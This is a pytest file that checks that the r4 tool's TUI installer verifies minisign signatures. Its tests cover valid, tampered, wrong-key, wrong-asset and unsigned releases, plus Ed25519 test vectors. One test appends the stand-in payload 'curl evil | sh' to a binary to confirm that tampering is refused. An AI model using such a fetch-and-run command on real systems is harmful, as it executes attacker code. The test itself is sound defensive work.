"""``r4 tui install`` verifies the release's minisign signature (TUI binary
signing, phase 1; cycle-3 hard lane, 2026-10-21).

Before, the install checked only the ``.sha256`` published next to the
binary in the same release: whoever could replace the binary could replace
its checksum. Now a published ``<asset>.minisig`` is verified against the
release public key pinned in r4 (``tui.MINISIGN_PUBLIC_KEY``) and a bad one
aborts the install; with none published (or no key pinned yet) the install
proceeds with a loud warning that authenticity was not checked.

The key pair here is generated in the test (pure-Python Ed25519 signing over
the verifier's own curve arithmetic); a vector made by the real minisign
0.12 pins format compatibility.
"""

from __future__ import annotations

import base64
import hashlib
import os
from pathlib import Path

import pytest

from r4._cli import tui, tui_minisign
from r4._cli.tui_minisign import BASE, compress, scalar_mult

_L = 2**252 + 27742317777372353535851937790883648493


class _TestKey:
    """A throwaway minisign key pair (never a release key)."""

    def __init__(self, key_id: bytes | None = None) -> None:
        self.seed = os.urandom(32)
        self.key_id = key_id or os.urandom(8)
        h = hashlib.sha512(self.seed).digest()
        self._a = (int.from_bytes(h[:32], "little") & ((1 << 254) - 8)) | (1 << 254)
        self._prefix = h[32:]
        self.public = compress(scalar_mult(self._a, BASE))

    def _sign(self, message: bytes) -> bytes:
        r = int.from_bytes(hashlib.sha512(self._prefix + message).digest(), "little") % _L
        big_r = compress(scalar_mult(r, BASE))
        k = int.from_bytes(hashlib.sha512(big_r + self.public + message).digest(), "little")
        return big_r + ((r + k % _L * self._a) % _L).to_bytes(32, "little")

    def public_key_text(self) -> str:
        line = base64.b64encode(b"Ed" + self.key_id + self.public).decode()
        return f"untrusted comment: minisign public key\n{line}\n"

    def minisig(self, data: bytes, trusted: str) -> str:
        signature = self._sign(hashlib.blake2b(data, digest_size=64).digest())
        global_sig = self._sign(signature + trusted.encode())
        return (
            "untrusted comment: signature from minisign secret key\n"
            f"{base64.b64encode(b'ED' + self.key_id + signature).decode()}\n"
            f"trusted comment: {trusted}\n"
            f"{base64.b64encode(global_sig).decode()}\n"
        )


@pytest.fixture
def key(monkeypatch: pytest.MonkeyPatch) -> _TestKey:
    k = _TestKey()
    monkeypatch.setattr(tui, "MINISIGN_PUBLIC_KEY", k.public_key_text().splitlines()[1])
    return k


@pytest.fixture
def release(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """A file:// release with the binary and its sha256; returns a publisher."""
    monkeypatch.setenv("R4_TUI_HOME", str(tmp_path / "tui-home"))
    dist = tmp_path / "dist"
    dist.mkdir()
    monkeypatch.setenv(tui.DIST_BASE_URL_ENV, dist.as_uri())
    name = tui.tui_asset_name()
    if name is None:
        pytest.skip("no TUI asset for this platform")

    def publish(binary: bytes, minisig: str | None = None) -> str:
        (dist / name).write_bytes(binary)
        digest = hashlib.sha256(binary).hexdigest()
        (dist / f"{name}.sha256").write_text(f"{digest}  {name}\n")
        if minisig is not None:
            (dist / f"{name}.minisig").write_text(minisig)
        return name

    return publish


BINARY = b"#!/bin/sh\necho signed-tui\n"


def _installed() -> bytes | None:
    path = tui.user_bin_path()
    return path.read_bytes() if path.is_file() else None


def test_a_good_signature_installs(release, key, capsys) -> None:
    name = tui.tui_asset_name()
    release(BINARY, key.minisig(BINARY, f"r4-tui v0.9.0 {name}"))
    assert tui.install_binary() == 0
    assert _installed() == BINARY
    assert "Signature OK" in capsys.readouterr().out


def test_a_tampered_binary_with_a_matching_checksum_is_refused(release, key, capsys) -> None:
    name = tui.tui_asset_name()
    signature = key.minisig(BINARY, f"r4-tui v0.9.0 {name}")
    release(BINARY + b"curl evil | sh\n", signature)  # attacker also rewrote .sha256
    assert tui.install_binary() == 1
    assert _installed() is None
    assert "Signature check FAILED" in capsys.readouterr().err


def test_a_signature_by_another_key_is_refused(release, key, capsys) -> None:
    name = tui.tui_asset_name()
    other = _TestKey(key_id=key.key_id)  # same key id, different key
    release(BINARY, other.minisig(BINARY, f"r4-tui v0.9.0 {name}"))
    assert tui.install_binary() == 1
    assert _installed() is None


def test_another_assets_signature_is_refused(release, key, capsys) -> None:
    release(BINARY, key.minisig(BINARY, "r4-tui v0.9.0 r4-tui-some-other-platform"))
    assert tui.install_binary() == 1
    assert "does not name" in capsys.readouterr().err


def test_an_absent_signature_installs_with_a_loud_warning(release, key, capsys) -> None:
    release(BINARY)
    assert tui.install_binary() == 0
    assert _installed() == BINARY
    err = capsys.readouterr().err
    assert "no signature" in err and "AUTHENTICITY" in err and "NOT" in err


def test_a_signed_release_without_a_pinned_key_warns(release, monkeypatch, capsys) -> None:
    monkeypatch.setattr(tui, "MINISIGN_PUBLIC_KEY", "")
    name = tui.tui_asset_name()
    release(BINARY, _TestKey().minisig(BINARY, f"r4-tui v0.9.0 {name}"))
    assert tui.install_binary() == 0
    assert "pins no release public key" in capsys.readouterr().err


# Made by minisign 0.12 (`minisign -G -W`, then `minisign -S -t ...`) with a
# throwaway key whose secret half was deleted; the file is VECTOR_DATA.
VECTOR_PUBLIC_KEY = "RWRuydBBYLYXUyf+aCNMB20dQyZ++6ogMOfQB6o5J40oNBxhaOrmBpA3"
VECTOR_DATA = b"r4 minisign compatibility vector\n"
VECTOR_MINISIG = """untrusted comment: signature from minisign secret key
RURuydBBYLYXU0KiCyCxZ2Q84taYVVWuCHdh+9LQTI4FqkTnO8BsfP4GfnYZVay4ph4bliirObFqYlYulN79H20ESOPk3OwSRAM=
trusted comment: r4-tui v0.0.0-test vec.txt
hHNhSBL8R1nx6hr9l5WQT6nAyyj9k74DEqrTcP/JUar+Ip1Nq7K6zx2U+2ePduT8Pj9ReZz7da9GAlwZvfEaAA==
"""


def test_a_real_minisign_signature_verifies(tmp_path: Path) -> None:
    path = tmp_path / "vec.txt"
    path.write_bytes(VECTOR_DATA)
    trusted = tui_minisign.verify_file(path, VECTOR_MINISIG, VECTOR_PUBLIC_KEY)
    assert trusted == "r4-tui v0.0.0-test vec.txt"
    path.write_bytes(VECTOR_DATA + b"!")
    with pytest.raises(tui_minisign.SignatureError):
        tui_minisign.verify_file(path, VECTOR_MINISIG, VECTOR_PUBLIC_KEY)


def test_rfc8032_vector() -> None:
    public = bytes.fromhex("d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a")
    signature = bytes.fromhex(
        "e5564300c360ac729086e2cc806e828a84877f1eb8e5d974d873e065224901555"
        "fb8821590a33bacc61e39701cf9b46bd25bf5f0595bbe24655141438e7a100b"
    )
    assert tui_minisign.ed25519_verify(public, b"", signature)
    assert not tui_minisign.ed25519_verify(public, b"x", signature)
